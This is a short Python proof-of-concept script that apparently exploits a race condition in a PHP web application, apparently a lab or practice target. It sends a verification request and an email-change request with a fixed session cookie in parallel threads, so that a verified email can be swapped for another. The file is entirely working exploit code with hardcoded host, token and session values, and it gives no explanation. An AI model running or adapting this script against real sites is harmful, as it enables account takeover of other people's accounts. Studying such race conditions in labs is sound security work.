#!/usr/bin/env python3
# coding=utf-8

"""
poc.py

author: Anemone95,x565178035@126.com
date: 2019-10-16 17:18
"""

import requests
import threading
HOST = "http://114.55.36.69:8023"
VERIFY_URL = "/verify.php?token=7lGBgYOtvxoW7mRHdsGEFJqr6YMDIJjD&username=admin1"
SESSION="h5evpbu7eclfe0kpfe3fad01q1"


def send_verify():
    res = requests.get(HOST + VERIFY_URL)
    print(res.text)


def reset_email():
    burp0_url = HOST + "/chgemail.php?token=JaX1dpl3"
    burp0_cookies = {"PHPSESSID": SESSION}
    burp0_data = {"email": "ambulong@vulnspy.com", "submit": "Submit"}
    res=requests.post(
        burp0_url,
        cookies=burp0_cookies,
        data=burp0_data)
    print(res.text)


def poc():
    t1 = threading.Thread(target=send_verify, args=())
    t2 = threading.Thread(target=reset_email, args=())
    t1.start()
    t2.start()
    t1.join()
    t2.join()

if __name__ == '__main__':
    poc()
